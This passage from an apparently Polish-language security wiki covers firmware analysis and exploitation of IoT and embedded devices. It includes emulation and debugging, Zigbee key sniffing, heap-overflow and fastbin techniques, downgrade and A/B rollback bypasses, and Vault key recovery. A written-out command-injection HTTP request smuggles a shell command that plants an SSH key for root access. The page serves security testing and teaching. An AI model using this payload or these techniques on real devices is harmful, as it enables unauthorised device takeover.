Zastępczy init powinien odwzorowywać operacyjne elementy oryginalnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, podłączyć `/dev/console` do deskryptorów plików 0–2, zamontować `/proc` i `/sys`, poczekać na udostępnione urządzenie blokowe, zamontować zmodyfikowany root tylko do odczytu, odmontować pseudo-systemy plików starego root, przenieść nowy punkt montowania na `/`, wykonać `chroot` i uruchomić `execve()` oryginalnego `/sbin/init` z firmware'u. Odmontowanie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odmontowaniu punktów montowania należących do nowego root.<sup>[[11]](#references)</sup>

Przechowuj zmienny stan urządzenia oddzielnie od zmodyfikowanego, niezmiennego root. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, podczas gdy drugi, tylko do odczytu dysk virtio udostępnia zmodyfikowany SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź stan trwały poza systemem gościa, gdy powolne uruchamianie, destrukcyjne skrypty startowe lub zawodny zapis w konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj nakładki używanej przez działającą maszynę wirtualną; udostępnij ją za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do właściwej partycji NBD i dezaktywuj grupę woluminów przed jej odłączeniem.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Aby powtarzalnie izolować usterki, zapisuj pliki znaczników z sygnaturami czasowymi na stabilnym, zapisywalnym woluminie i weryfikuj je offline; `/dev/kmsg`, FIFO i nietrwałe konsole mogą dawać fałszywie ujemne wyniki z powodu ograniczania liczby komunikatów lub przedwczesnego zakończenia procesu. Przed zmianą niezwiązanego kodu porównuj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje ext4 na dysku z konfiguracją jądra oraz generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników określonymi na podstawie PCI. Komponent może istnieć, a nawet pomyślnie załadować się za pomocą `dlopen()`, ale nadal być bezużyteczny, ponieważ jego odbiorca oczekuje innego ABI.<sup>[[11]](#references)</sup>

## Dynamiczna analiza w praktyce

Na tym etapie do analizy używa się prawdziwego lub emulowanego środowiska urządzenia. Niezbędne jest utrzymanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji sprzętowych, co czasami wymaga ponownego uruchomienia emulacji. Analiza powinna obejmować ponowne sprawdzenie systemu plików, exploitowanie ujawnionych stron internetowych i usług sieciowych oraz badanie podatności bootloadera. Testy integralności firmware’u są kluczowe do identyfikowania potencjalnych podatności typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać punkty przerwania oraz identyfikować podatności za pomocą fuzzingu i innych technik.

W przypadku celów wbudowanych bez pełnego debuggera **skopiuj na urządzenie statycznie połączony `gdbserver` i podłącz się zdalnie**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / koprocesora radiowego

W hubach IoT stos RF jest często podzielony między **radiowy MCU** a proces w przestrzeni użytkownika systemu Linux. Przydatny schemat działania polega na zmapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** działający na radiowym MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do systemu Linux (na przykład przez `/dev/tty*`)
4. **Dispatcher aplikacji** w głównym demonie
5. **Handler specyficzny dla protokołu / maszyna stanów**

Taka architektura tworzy dwa cele do analizy wstecznej zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, ustal:

- **Grupy komunikatów** i tabele dispatchera
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola rozróżniające dla danego producenta** (na przykład Zigbee `manufacturer_code` i niestandardowy `cluster_command`)
- Które handlery są osiągalne tylko podczas **commissioningu**, wykrywania urządzeń lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch związany z parowaniem i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuchanie ruchu podczas commissioningu może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, dlatego sprawdź, czy testowane urządzenie rzeczywiście wymusza ich użycie.

### Handlery protokołów specyficzne dla producenta i osiągalność zależna od FSM

Polecenia Zigbee/ZCL specyficzne dla producenta są często lepszym celem niż standardowe klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, które przeszły mniej testów walidacyjnych.<sup>[[8]](#references)</sup>

Praktyczny schemat działania:

- Analizuj wstecz dispatcher poleceń, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odtwórz tabele **stanu FSM**, **zdarzeń**, **warunków sprawdzających**, **akcji** i **następnych stanów**.
- Znajdź **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponawiania prób/błędów, które ostatecznie resetują lub zwalniają stan kontrolowany przez atakującego.
- Ustal, które prawidłowe wymiany protokołu są wymagane, aby wprowadzić demona w podatny stan, zamiast zakładać, że błędny handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na opóźnienia odtwarzanie pakietów za pomocą frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) za pomocą stosu klasy produkcyjnej, aby udostępnić właściwe **endpointy**, **atrybuty** i parametry czasowe commissioningu.

### Klasa błędów związana z pofragmentowanym pobieraniem wbudowanych demonów

Powtarzająca się klasa błędów firmware występuje przy **pofragmentowanym pobieraniu blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają jedynie kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia, czy mieści się w **pierwotnie zaalokowanym rozmiarze**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z **małym** zadeklarowanym rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Podrobiony rozmiar lokalny dla pakietu, który przechodzi nowe kontrole, a mimo to powoduje przepełnienie pierwotnie zaalokowanego bufora.

Jeśli podatna ścieżka jest chroniona logiką commissioningu, exploit musi obejmować wystarczającą **emulację urządzenia**, aby wprowadzić cel w oczekiwany stan pobierania modelu lub bloba przed wysłaniem nieprawidłowych fragmentów.

### Wyzwalanie `free()` przez protokół

We wbudowanych demonach najłatwiejszym sposobem wywołania eksploatacji metadanych sterty jest często nie „czekanie na sprzątanie”, lecz **wymuszenie obsługi błędów przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stany **ponawiania** lub **błędu**.
- Przekrocz limit ponowień, aby demon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-podobnych** w systemie Linux dla urządzeń wbudowanych, gdzie uszkodzenie metadanych chunków może zmienić logikę unlink/unbin w prymityw zapisu. Stabilnym rozwiązaniem jest uszkodzenie **pola rozmiaru**, aby skierować przechodzenie alokatora do **fałszywych chunków umieszczonych w przepełnionym buforze**, zamiast natychmiast nadpisywać rzeczywiste wskaźniki binów i powodować awarię procesu.

## Eksploatacja binarna i proof-of-concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu i programowania w językach niskiego poziomu. Zabezpieczenia środowiska uruchomieniowego binariów są rzadkością w systemach wbudowanych, ale jeśli występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące eksploatacji fastbin w uClibc (Linux w urządzeniach wbudowanych)

- **Fastbiny + konsolidacja:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, więc każdy fałszywy chunk musi przejść kontrole (rozsądny rozmiar, `fd = 0` i sąsiednie chunki uznawane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE przy ASLR:** jeśli ASLR jest włączone, ale główny plik binarny jest **non-PIE**, adresy w jego sekcjach `.data/.bss` są stałe. Można wskazać obszar, który już przypomina prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin do **tablicy wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do wykonania stack pivot/łańcucha ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i przekazać mu sterowanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy OS do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do oceny bezpieczeństwa i testów penetracyjnych urządzeń Internetu rzeczy (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony we wstępnie zainstalowane narzędzia do testowania bezpieczeństwa firmware.

## Ataki polegające na downgrade firmware i niezabezpieczone mechanizmy aktualizacji

Nawet gdy producent wdraża kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed przywróceniem starszej wersji (downgrade) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania sprawdza jedynie podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *wersji* (ani licznika monotonicznego) wgrywanego obrazu, atakujący może legalnie zainstalować **starsze, podatne firmware z nadal prawidłowym podpisem**, przywracając w ten sposób załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Zdobądź starszy, podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN lub strony pomocy technicznej.
   * Wyodrębnij go z powiązanych aplikacji mobilnych/desktopowych (np. z katalogu `assets/firmware/` w pliku Android APK).
   * Pobierz go z repozytoriów zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** za pośrednictwem dostępnego kanału aktualizacji:
   * Interfejs WWW, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia nieuwierzytelnione endpointy HTTP(S), które przyjmują zakodowane w Base64 bloby firmware, dekodują je po stronie serwera i uruchamiają odzyskiwanie/aktualizację.
3. Po downgrade wykorzystaj podatność, którą naprawiono w nowszym wydaniu (na przykład filtr command injection dodany w późniejszej wersji).
4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu trwałego dostępu.

### Przykład: command injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (downgrade’owanym) firmware parametr `md5` jest bezpośrednio dołączany do polecenia powłoki bez sanitizacji, co pozwala na wstrzykiwanie dowolnych poleceń (w tym przypadku — umożliwiających dostęp do roota z użyciem klucza SSH). W późniejszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed downgrade’em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do swoich aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w postaci niezaszyfrowanej w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykłe `unzip` pozwalają wyodrębnić podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Obejście anti-rollback wyłącznie w updaterze w projektach z slotami A/B

Niektórzy dostawcy implementują mechanizm **ratchet** zapobiegający downgrade’om, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie odzyskiwania lub agencie OTA działającym w przestrzeni użytkownika). Jeśli **bootloader** sprawdza później tylko podpis/CRC obrazu i ufa tablicy partycji lub metadanym slotu, nadal można obejść ochronę przed rollbackiem.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware’u zawierają zarówno deskryptor wersji, jak i **ratchet bezpieczeństwa** / licznik monotoniczny.
- Updater porównuje wartość ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- Bootloader **nie** analizuje tej wartości ratchet i przed uruchomieniem wybranego slotu weryfikuje tylko nagłówek, CRC i podpis.
- Aktywacja slotu jest zapisywana osobno, w tablicy partycji lub liczniku generacji dla danego slotu, i **nie jest kryptograficznie powiązana** z dokładnym digestem zweryfikowanego firmware’u.

W systemach z dwoma slotami umożliwia to zastosowanie prymitywu **zweryfikuj jeden obraz / uruchom inny obraz**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel rozruchu, używając aktualnego, podpisanego obrazu, a następnie nadpisać slot B przed ponownym uruchomieniem, bootloader może mimo to uruchomić starszy obraz, ponieważ ufa jedynie wcześniej zatwierdzonym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny, podpisany** firmware do nieaktywnego slotu i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył ten slot jako następny aktywny.
2. **Nie uruchamiaj jeszcze ponownie urządzenia**. W tej samej sesji ponownie uruchom procedurę przygotowania/czyszczenia slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub logikę wyboru slotu, aby updater wyczyścił **ten sam fizyczny slot**, który właśnie został aktywowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji, która egzekwuje ratchet, i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybierze aktywowany slot, zweryfikuje tylko podpis/integralność i uruchomi stary obraz.

Na co zwrócić uwagę podczas analizy wstecznej implementacji aktualizacji A/B:

- Wybór slotu oparty na **flagach czasu rozruchu**, które nie są odświeżane po udanym przełączeniu.
- Procedura w stylu `prepare_passive_slot()`, która czyści slot na podstawie nieaktualnego stanu, zamiast **bieżącego zatwierdzonego układu**.
- Funkcja w stylu `part_write_layout()`, która tylko zwiększa **licznik generacji** / ustawia flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
- Kontrole ratchet zaimplementowane w przestrzeni użytkownika lub kodzie updatera, ale **nie** w ROM-ie / bootloaderze / etapach secure boot.
- Procedury czyszczenia lub odzyskiwania, które pozostawiają slot oznaczony jako rozruchowy, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed zapisem firmware’u?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. podpisy są sprawdzane przez kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko podpis/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware’u**, czy slot można zmodyfikować po aktywacji?
* Czy po udanym przełączeniu slotu urządzenie musi zostać ponownie uruchomione, czy też w tej samej sesji nadal można wywoływać kolejne procedury aktualizacji/czyszczenia?
* Czy kod w przestrzeni użytkownika wykonuje dodatkowe kontrole poprawności (np. dozwolonej mapy partycji, numeru modelu)?
* Czy przepływy aktualizacji *częściowej* lub *z kopii zapasowej* korzystają ponownie z tej samej logiki weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych podatnych projektów firmware’u.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware’u ze stanu osadzonego KMS/Vault

Gdy obraz aktualizacji zawiera niewielkie metadane w postaci jawnej oraz duży blok danych o wysokiej entropii, przed próbami brute force przeprowadź wstępną analizę kontenera:<sup>[[1]](#references)</sup>

- Zrzutuj nagłówki, przesunięcia i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje, że mamy do czynienia z szyfrogramem RSA-2048 zawierającym losowe hasło/klucz sesji firmware’u.
- Odłączony materiał PGP w tym samym pliku często służy wyłącznie do potwierdzania autentyczności; nie zakładaj, że odpowiada za poufność.

Jeśli poszukiwania kluczy statycznych (`grep`, `strings`, wyszukiwanie PEM/PGP) nic nie dają, przeanalizuj **operacyjną ścieżkę deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, kto odczytuje zaszyfrowany blok, która funkcja pomocnicza/API go odszyfrowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony główny system plików w poszukiwaniu stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj jawne polecenia `vault operator unseal ...`, klucze odzyskiwania, tokeny bootstrap lub lokalne skrypty automatycznego odblokowywania KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci masowej, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root w sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Przetestuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Niepowodzenie deszyfrowania PKCS#1 v1.5 i domyślnego deszyfrowania OAEP **nie** dowodzi, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez dostawcę (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim spróbujesz deszyfrować AES-CBC.

To zmienia „zaszyfrowane firmware” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz offline dokładne parametry unwrap + KDF**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie firmware z Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczne hakowanie IoT: Kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do Twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś przejęty](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv — Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania — część 2: obejście ochrony przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zacznie migać: zdalne wykorzystywanie Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, część 1: rozpakowywanie](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacja jądra Linux — dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Hasła BIOS-u Dell: słabe szyfrowanie XOR umożliwia odzyskanie ze SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn — narzędzie do odzyskiwania haseł BIOS-u Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Odświeżamy wiedzę o hakowaniu sprzętu, część 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
